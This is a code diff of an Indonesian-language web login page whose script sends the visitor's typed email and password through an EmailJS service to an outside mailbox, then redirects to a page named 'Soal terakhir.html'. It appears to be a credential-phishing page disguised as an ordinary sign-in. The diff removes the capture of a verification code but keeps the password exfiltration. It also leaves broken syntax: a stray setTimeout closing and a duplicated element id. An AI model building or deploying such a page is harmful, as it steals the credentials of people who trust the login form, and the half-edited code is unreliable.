@@ -104,7 +104,7 @@
     <form id="loginForm">
       <input type="email" id="email" placeholder="Masukkan Email" required>
       <input type="password" id="password" placeholder="Masukkan Password" required>
-      <a href="Soal terakhir.html"><button type="submit">Masuk</button></a>
+      <a href="Soal terakhir.html"><button type="submit" id="loginForm">Masuk</button></a>
     </form>
     <div class="policy">
       <a href="privacy.html">Privacy & Policy</a>
@@ -118,19 +118,14 @@
 
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
-    const loading = document.getElementById("loading");
-    loading.style.display = "block";
 
     const templateParams = {
       user_email: email,
-      user_password: password,
-      verification_code: code
+      user_password: password
     };
 
     emailjs.send("service_y5ba2kk", "template_pini9ru", templateParams)
       .then(() => {
-        loading.innerText = "Penyimpanan data berhasil";
-        setTimeout(() => {
           window.location.href = "Soal terakhir.html";
         }, 1500);
       })
